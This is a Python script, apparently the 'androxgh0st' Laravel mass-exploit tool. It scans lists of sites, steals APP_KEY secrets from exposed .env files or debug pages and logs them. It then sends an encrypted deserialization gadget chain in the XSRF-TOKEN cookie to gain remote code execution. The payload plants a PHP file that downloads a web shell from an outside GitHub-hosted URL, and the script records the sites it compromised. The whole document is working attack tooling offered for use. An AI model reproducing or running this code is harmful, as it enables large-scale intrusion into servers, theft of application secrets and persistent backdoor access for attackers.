# -*- coding: utf-8 -*-
''' No bio yet'''

import hmac, hashlib, json, requests, re, threading, time, random, sys, os
requests.packages.urllib3.disable_warnings()
from hashlib import sha256
from base64 import b64decode
from base64 import b64encode
from Crypto import Random
from Crypto.Cipher import AES
from Queue import Queue
from threading import Thread


# Payload configure
pathname = 'pler.php'
p = '<?php $root = $_SERVER["DOCUMENT_ROOT"]; $myfile = fopen($root . "/'+pathname+'", "w") or die("Unable to open file!"); $code = "PD9waHAKZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CgkkZnAgPSBmb3BlbigkaXNpLCAidyIpOwoJJGNoID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9CSU5BUllUUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTsKCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsKCWN1cmxfY2xvc2UoJGNoKTsKCWZjbG9zZSgkZnApOwoJb2JfZmx1c2goKTsKCWZsdXNoKCk7Cn0KaWYoYWRtaW5lcignaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaW50eHBsb2l0L21pbmlzaGVsbC9tYWluL3BsZXIudHh0JywgYmFzZW5hbWUoX19GSUxFX18pKSkgewoJaGVhZGVyKCdMb2NhdGlvbjogJy4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXSk7Cn0gZWxzZSB7CgllY2hvICJVbmtub3duIGVycm9yPGJyPiI7Cn0KPz4="; fwrite($myfile, base64_decode($code)); fclose($myfile); echo("Chitoge kirisaki?! Tsundere,kawaii <3");'
exploit_code = 'O:29:"Illuminate\Support\MessageBag":2:{s:11:"' + "\x00" + '*' + "\x00" + 'messages";a:0:{}s:9:"' + "\x00" + '*' + "\x00" + 'format";O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' + "\x00" + '*' + "\x00" + 'name";s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:' + str(len(p)) + ':"' + p + '";}}}}'

# Preparing
BLOCK_SIZE = 16
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
				chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

class Worker(Thread):
	def __init__(self, tasks):
		Thread.__init__(self)
		self.tasks = tasks
		self.daemon = True
		self.start()

	def run(self):
		while True:
			func, args, kargs = self.tasks.get()
			try: func(*args, **kargs)
			except Exception, e: print e
			self.tasks.task_done()

class ThreadPool:
	def __init__(self, num_threads):
		self.tasks = Queue(num_threads)
		for _ in range(num_threads): Worker(self.tasks)

	def add_task(self, func, *args, **kargs):
		self.tasks.put((func, args, kargs))

	def wait_completion(self):
		self.tasks.join()


class androxgh0st:
	''' There is no failure except in no longer trying. xD '''  
	def encrypt(self, raw, key):
		raw = pad(raw)
		iv = Random.new().read(AES.block_size)
		cipher = AES.new(key, AES.MODE_CBC, iv)
		rawco = cipher.encrypt(raw)
		mac = hmac.new(key, b64encode(iv)+b64encode(rawco), hashlib.sha256).hexdigest()
		value = b64encode(rawco)
		iv = b64encode(iv)
		data = {}
		data['iv'] = str(iv)
		data['value'] = str(value)
		data['mac'] = str(mac)
		json_data = json.dumps(data)
		return  json_data

	def get_env(self, text, url):
		#headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
		#text = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
		if "APP_KEY" in text:
			if "APP_KEY=" in text:
				appkey = re.findall("APP_KEY=([a-zA-Z0-9:;\/\\=$%^&*()-+_!@#]+)", text)[0]
			else:
				#text = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
				if "<td>APP_KEY</td>" in text:
					appkey = re.findall("<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
			if appkey:
				if '"' in appkey or "'" in appkey:
					appkey = appkey[1:-1]
				return appkey
			else:
				return False
		else:
			return False

def printf(text):
	''.join([str(item) for item in text])
	print(text + '\n'),

def exploit(url):
	asu = url
	resp = False
	try:
		text = '\033[32;1m#\033[0m '+url
		headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
		get_source = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
		if "APP_KEY=" in get_source:
			resp = get_source
			method = 'vuln_dotenv.txt'
		else:
			get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
			if "<td>APP_KEY</td>" in get_source:
				resp = get_source
				method = 'vuln_postdata.txt'
		if resp:
			getkey = androxgh0st().get_env(resp, url)
			if getkey:
				savekey = open(method,'a')
				savekey.write(url + '|' + getkey + '\n')
				savekey.close()
				api_key = getkey.replace('base64:', '')
				key = b64decode(api_key)
				xnxx = androxgh0st().encrypt(exploit_code, key)
				matamu = b64encode(str(xnxx))
				cokk = {"XSRF-TOKEN": matamu}
				curler = requests.get(url+'/public', cookies=cokk, verify=False, timeout=8, headers=headers).text
				y = curler.split("</html>")[1]
				if "Chitoge kirisaki?! Tsundere,kawaii <3" not in y:
					curler = requests.get(url+'/', cookies=cokk, verify=False, timeout=8, headers=headers).text
				asu =  requests.get(url + '/'+pathname+'?Chitoge', verify=False, timeout=8, headers=headers, allow_redirects=False).text
				if "Unknown error<br>" in asu:
					text += " | \033[32;1mSuccess can't spawn shell\033[0m"
					save = open('cant_spawn_shell.txt','a')
					save.write(url)
					save.close()
				else:
					cekshell = requests.get(url + '/'+pathname+'?Chitoge', verify=False, timeout=8, headers=headers).text
					if 'Chitoge kirisaki' in cekshell:
						text += " | \033[32;1mSuccess\033[0m"
						save = open('shell_results.txt','a')
						save.write(url + '/'+pathname+'?Chitoge\n')
						save.close()
					else:
						text += " | \033[31;1mCan't exploit\033[0m"
			else:
				text += " | \033[31;1mCan't get APP_KEY\033[0m"
				savekey = open('cant_getkey.txt','a')
				savekey.write(url + '\n')
				savekey.close()
		else:
			text += " | \033[31;1mCan't get APP_KEY using .env or debug mode\033[0m"
			savekey = open('not_vuln.txt','a')
			savekey.write(url + '\n')
			savekey.close()
	except KeyboardInterrupt:
		exit()
	except Exception as err:
		text += " | \033[31;1mError: "+str(err)+"\033[0m"
		savekey = open('site_error.txt','a')
		savekey.write(url + '\n')
		savekey.close()
	printf(text)

try:
	lists = sys.argv[1]
except:
	print('''How to use:
	- python rce.py check [url] <- for single target
	- python rce.py [filelist] [thread] <- mass exploit

''')
	exit()

if lists == "check":
	url = sys.argv[2]
	exploit(url)
	exit()

numthread = sys.argv[2]
pool = ThreadPool(int(numthread))
readsplit = open(lists).read().splitlines()
for url in readsplit:
	if "://" in url:
		url = url
	else:
		url = "http://"+url
	pool.add_task(exploit, url)
pool.wait_completion()
